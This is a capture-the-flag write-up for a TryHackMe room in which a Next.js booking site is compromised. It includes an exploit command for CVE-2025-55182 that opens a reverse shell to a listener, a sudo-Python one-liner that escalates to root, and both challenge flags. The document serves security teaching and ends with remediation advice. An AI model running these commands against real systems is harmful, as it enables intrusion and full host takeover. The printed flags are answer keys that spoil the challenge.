# Corp Website

**Room:** [Love at First Breach 2026 – Corp Website](https://tryhackme.com/room/lafb2026e7)

Retracing an attacker's steps on "Romance & Co." — a compromised web app. Exploit CVE-2025-55182 for RCE, land as a low-priv user, then escalate to root.

Target: `http://10.112.159.64:3000`

![Corp Website](../Screenshots/Love%20at%20First%20Breach%202026/corpweb_banner.png)

---

## Room Description

200 pts, Web, Medium. Scenario: "Romance & Co." was breached, logs are incomplete, need to retrace the attack.

![Room description](../Screenshots/Love%20at%20First%20Breach%202026/corpweb_roomdescription.png)

---

## Recon

Navigated to the site. Just a normal romantic-experiences booking company page, nothing notable on the surface.

![Romance & Co. website](../Screenshots/Love%20at%20First%20Breach%202026/corpweb_website.png)

Ran nmap:

```
nmap -sC -sV -p- <target>
```

Found 2 open ports:
- **22/tcp** — SSH (OpenSSH 8.9p1 Ubuntu)
- **3000/tcp** — Next.js app

![Nmap scan](../Screenshots/Love%20at%20First%20Breach%202026/corpweb_nmap.png)

---

## Vulnerability Discovery

Ran gobuster — nothing useful. Ran nuclei against the app — nothing on gobuster, but nuclei flagged a critical CVE:

```
[CVE-2025-55182] [http] [critical] http://10.114.187.208:3000
```

![Nuclei scan](screenshots/corpweb_nuclei.png)

Searched for the CVE and found a public exploit on GitHub:
[CVE-2025-55182](https://github.com/Chocapikk/CVE-2025-55182)

---

## Exploitation

Ran the exploit to get a reverse shell:

```
python3 exploit.py -u "http://10.114.187.208:3000" -r -l 192.168.134.30 -p 4444 -P nc-mkfifo
```

Connection lands as `daniel`:

```
uid=100(daniel) gid=101(secgroup) groups=101(secgroup),101(secgroup)
```

![Reverse shell as daniel](screenshots/corpweb_reverseshell.png)

---

## User Flag

```
cat /home/daniel/user.txt
THM{R34c7_2_5h311_3xpl017}
```

![User flag](screenshots/corpweb_userflag.png)

---

## Privilege Escalation

Ran the exploit again for a fresh shell, then escalated using sudo:

```
sudo python3 -c 'import os; os.system("/bin/ash")'
```

```
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

![Privilege escalation to root](screenshots/corpweb_privesc.png)

---

## Root Flag

```
cd root
THM{Pr1v_35c_47_175_f1n357}
```

![Root flag](screenshots/corpweb_rootflag.png)

---

## Flags

```
THM{R34c7_2_5h311_3xpl017}
THM{Pr1v_35c_47_175_f1n357}
```

---

## Vulnerability Summary

| | |
|---|---|
| **Vulnerability** | CVE-2025-55182 (RCE) + Privilege Escalation via sudo |
| **Location** | Next.js web app on port 3000 |
| **Root Cause** | Unpatched CVE-2025-55182 allows remote code execution; low-priv user `daniel` had sudo rights to run Python, which was used to spawn a root shell |
| **Impact** | Full remote code execution as `daniel`, then full root compromise of the host |
| **Fix** | Patch the vulnerable Next.js/app component to a version that resolves CVE-2025-55182. Remove unnecessary sudo privileges from low-priv users, especially for interpreters like Python that can trivially spawn shells |
